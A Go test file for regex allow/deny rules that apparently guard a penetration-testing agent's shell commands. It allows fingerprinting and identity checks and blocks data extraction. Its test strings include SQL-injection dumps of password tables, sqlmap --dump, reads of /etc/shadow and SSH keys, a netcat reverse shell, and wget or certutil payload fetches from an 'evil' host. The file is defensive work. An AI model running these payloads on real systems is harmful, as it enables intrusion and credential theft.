package db

import (
	"regexp"
	"testing"
)

// v4 内置规则的正则行为测试。规则匹配的是整个 tool_input JSON 串，用例按
// JSON 形态给出。loadLocked 对编译失败的正则是静默跳过，所以先逐条编译自检。

func v4Rules() []struct {
	name     string
	re       *regexp.Regexp
	action   string
	priority int
} {
	return []struct {
		name     string
		re       *regexp.Regexp
		action   string
		priority int
	}{
		{"SQL注入-数据提取与文件读写", regexp.MustCompile(sqlInjectionExtractionPattern), "deny", 75},
		{"敏感信息-读取文件内容", regexp.MustCompile(fileContentReadPattern), "deny", 70},
		{"SQL注入-指纹读取放行", regexp.MustCompile(sqlFingerprintAllowPattern), "allow", 68},
		{"RCE-身份命令放行", regexp.MustCompile(rceIdentityAllowPattern), "allow", 65},
		{"RCE-非白名单命令", regexp.MustCompile(rceNonWhitelistPattern), "deny", 60},
		{"目录文件名浏览放行", regexp.MustCompile(listingAllowPattern), "allow", 55},
	}
}

// evaluate 按优先级从高到低取第一条命中的规则，与 Interceptor.Match 的
// first-match-wins 语义一致（rules 已按 priority 降序排列）。
func evaluate(rules []struct {
	name     string
	re       *regexp.Regexp
	action   string
	priority int
}, input string) (action, rule string) {
	for _, r := range rules {
		if r.re.MatchString(input) {
			return r.action, r.name
		}
	}
	return "none", ""
}

func TestV4PatternsCompile(t *testing.T) {
	for _, p := range []string{
		sqlInjectionExtractionPattern,
		fileContentReadPattern,
		sqlFingerprintAllowPattern,
		rceIdentityAllowPattern,
		rceNonWhitelistPattern,
		listingAllowPattern,
	} {
		if _, err := regexp.Compile(p); err != nil {
			t.Errorf("正则编译失败(loadLocked 会静默跳过该规则): %v\n%s", err, p)
		}
	}
}

func TestSQLInjectionExtractionPattern(t *testing.T) {
	re := regexp.MustCompile(sqlInjectionExtractionPattern)
	hit := []string{
		`{"command":"curl \"http://t/?id=1' UNION SELECT username,password FROM users--\""}`,
		`{"command":"curl \"http://t/?id=1' UNION SELECT 1,2,3 FROM information_schema.tables--\""}`,
		`{"command":"sqlmap -u http://t/?id=1 --dump"}`,
		`{"command":"sqlmap -u http://t/?id=1 -T users --dump-all"}`,
		`{"command":"sqlmap -u http://t/?id=1 --tables -D web"}`,
		`{"command":"sqlmap -u http://t/?id=1 --passwords"}`,
		`{"command":"sqlmap -u http://t/?id=1 --file-read /etc/passwd"}`,
		`{"command":"curl \"http://t/?id=1' AND LOAD_FILE('/etc/passwd')--\""}`,
		`{"command":"curl \"http://t/?id=1' INTO OUTFILE '/tmp/x'--\""}`,
		`{"command":"psql -c \"SELECT * FROM pg_tables\""}`,
		`{"command":"curl \"http://t/?id=1';EXEC xp_cmdshell 'dir'--\""}`,
		`{"command":"curl \"http://t/?id=1' AND (SELECT substr((SELECT password FROM users),1,1))='a'--\""}`,
	}
	for _, s := range hit {
		if !re.MatchString(s) {
			t.Errorf("应命中却放行: %s", s)
		}
	}
	miss := []string{
		`{"command":"curl \"http://t/?id=1' UNION SELECT database(),version(),user()--\""}`, // 纯指纹，无FROM
		`{"command":"curl \"http://t/?id=1' AND extractvalue(1,concat(0x7e,version()))--\""}`,
		`{"command":"sqlmap -u http://t/?id=1 --current-db"}`,
		`{"command":"sqlmap -u http://t/?id=1 --banner --current-user"}`,
		`{"command":"nmap -sV -p 3306 10.0.0.1"}`,
		`{"command":"python -c \"print('selected tables, from list')\""}`, // 散文式单词不算SQL
	}
	for _, s := range miss {
		if re.MatchString(s) {
			t.Errorf("误拦: %s", s)
		}
	}
}

func TestFileContentReadPattern(t *testing.T) {
	re := regexp.MustCompile(fileContentReadPattern)
	hit := []string{
		`{"command":"cat /etc/passwd"}`,
		`{"command":"cat flag.txt"}`,
		`{"command":"tac /app/application.yml"}`,
		`{"command":"head -n 5 /etc/shadow"}`,
		`{"command":"nl /var/www/html/index.php"}`,
		`{"command":"strings /app/bin/server"}`,
		`{"command":"find / -name id_rsa -exec cat {} +"}`,
		`{"command":"type C:\\Windows\\win.ini"}`,
		`{"command":"type config.php.bak"}`,
		`{"command":"powershell Get-Content C:\\inetpub\\web.config"}`,
		`{"command":"findstr /i password C:\\app\\config.xml"}`,
		`{"command":"curl file:///etc/passwd"}`,
	}
	for _, s := range hit {
		if !re.MatchString(s) {
			t.Errorf("应命中却放行: %s", s)
		}
	}
	miss := []string{
		`{"command":"ls -la /etc"}`,
		`{"command":"dir C:\\inetpub"}`,
		`{"command":"find / -name \"*.pem\" 2>/dev/null"}`,
		`{"command":"tree /app"}`,
		`{"command":"echo hi | cat"}`,   // 无文件参数
		`{"command":"cat README"}`,      // 无路径特征，交给 LLM 兜底
		`{"command":"curl http://t/a"}`, // 普通请求
	}
	for _, s := range miss {
		if re.MatchString(s) {
			t.Errorf("误拦: %s", s)
		}
	}
}

func TestRCEIdentityAllowPattern(t *testing.T) {
	re := regexp.MustCompile(rceIdentityAllowPattern)
	hit := []string{
		`{"command":"curl \"http://t/?id=1;whoami\""}`,
		`{"command":"curl \"http://t/?id=1%3Bid\""}`,
		`{"command":"curl \"http://t/ping?cmd=whoami\""}`,
		`{"command":"curl \"http://t/ping?cmd=whoami&do=1\""}`,
		`{"command":"curl \"http://t/ping?cmd=dir C:\\inetpub\""}`,
		`{"command":"curl http://t/rce -d \"cmd=whoami\""}`,
		`{"command":"curl http://t/rce --data-raw 'cmd=id'"}`,
		`{"command":"whoami"}`,
		`{"command":"echo %username%"}`,
		`{"command":"result=$(whoami)"}`,
	}
	for _, s := range hit {
		if !re.MatchString(s) {
			t.Errorf("应放行却未命中白名单: %s", s)
		}
	}
	// 白名单必须"干净完整"：拼接其他命令的载荷不得命中放行。
	miss := []string{
		`{"command":"curl \"http://t/?id=1;whoami;cat /etc/passwd\""}`,
		`{"command":"curl \"http://t/ping?cmd=whoami;cat /etc/passwd\""}`,
		`{"command":"curl \"http://t/ping?cmd=cat /etc/passwd\""}`,
		`{"command":"curl http://t/rce -d \"cmd=id;wget http://evil/x.sh\""}`,
		`{"command":"whoamicat"}`,
	}
	for _, s := range miss {
		if re.MatchString(s) {
			t.Errorf("拼接载荷不得命中白名单: %s", s)
		}
	}
}

func TestRCENonWhitelistPattern(t *testing.T) {
	re := regexp.MustCompile(rceNonWhitelistPattern)
	hit := []string{
		`{"command":"curl \"http://t/?id=1;cat /etc/passwd\""}`,
		`{"command":"curl \"http://t/?id=1|wget http://evil/x.sh\""}`,
		`{"command":"curl \"http://t/?id=1%0Anc -e /bin/sh 1.2.3.4 4444\""}`,
		`{"command":"curl \"http://t/ping?cmd=cat%20/etc/passwd\""}`,
		`{"command":"curl \"http://t/ping?cmd=type C:\\boot.ini\""}`,
		`{"command":"curl http://t/rce -d \"cmd=cat /etc/passwd\""}`,
		`{"command":"curl http://t/rce -d \"cmd=id;cat /etc/passwd\""}`,
		`{"command":"Write exp.py {\"cmd\":\"cat /etc/passwd\"}"}`,
		`{"command":"curl \"http://t/?id=1;certutil -urlcache -f http://evil/x.exe x.exe\""}`,
	}
	for _, s := range hit {
		if !re.MatchString(s) {
			t.Errorf("应命中却放行: %s", s)
		}
	}
	miss := []string{
		`{"command":"curl \"http://t/fonts.css?v=1|woff2\""}`,     // 非命令词
		`{"command":"curl \"http://t/;jsessionid=abc\""}`,         // 矩阵参数
		`{"command":"curl \"http://t/a?category=5\""}`,            // cat 前缀但非独立命令
		`{"command":"curl \"http://t/api?redirect=/home\""}`,      // 常规参数
		`{"command":"cd /tmp && echo done"}`,                      // 本地链式命令不在拦截范围
		`{"command":"python -c \"import os; os.system('id')\"}"}`, // 代码形态，交给 LLM 兜底
		`{"command":"nmap -p 80 10.0.0.1"}`,
	}
	for _, s := range miss {
		if re.MatchString(s) {
			t.Errorf("误拦: %s", s)
		}
	}
}

func TestV4PrioritySemantics(t *testing.T) {
	rules := v4Rules()
	cases := []struct {
		input  string
		action string // 期望最终动作
	}{
		// SQL注入：指纹放行
		{`{"command":"curl \"http://t/?id=1' UNION SELECT database(),version(),user()--\""}`, "allow"},
		{`{"command":"curl \"http://t/?id=1' AND extractvalue(1,concat(0x7e,database()))--\""}`, "allow"},
		{`{"command":"sqlmap -u http://t/?id=1 --current-db --banner"}`, "allow"},
		// SQL注入：读其他数据被拦（deny 75 先于 allow 68）
		{`{"command":"sqlmap -u http://t/?id=1 --dump --current-db"}`, "deny"},
		{`{"command":"curl \"http://t/?id=1' UNION SELECT version(),password FROM mysql.user--\""}`, "deny"},
		// RCE：身份命令放行
		{`{"command":"curl \"http://t/ping?cmd=whoami\""}`, "allow"},
		{`{"command":"curl \"http://t/?id=1;uname -a\""}`, "allow"},
		// RCE：非白名单命令被拦（deny 60 兜住 allow 65 放不进的载荷）
		{`{"command":"curl \"http://t/ping?cmd=cat%20/etc/passwd\""}`, "deny"},
		{`{"command":"curl \"http://t/?id=1;whoami;cat /etc/passwd\""}`, "deny"}, // 拼接不进白名单→落deny
		{`{"command":"curl \"http://t/?id=1;wget http://evil/x.sh\""}`, "deny"},
		// 敏感信息：列名字放行、读内容被拦
		{`{"command":"ls -la /etc"}`, "allow"},
		{`{"command":"find / -name \"*.key\" 2>/dev/null"}`, "allow"},
		{`{"command":"cat /etc/passwd"}`, "deny"},
		{`{"command":"find / -name x -exec cat {} +"}`, "deny"},
	}
	for _, c := range cases {
		action, rule := evaluate(rules, c.input)
		if action != c.action {
			t.Errorf("期望 %s 实得 %s(规则:%s): %s", c.action, action, rule, c.input)
		}
	}
}
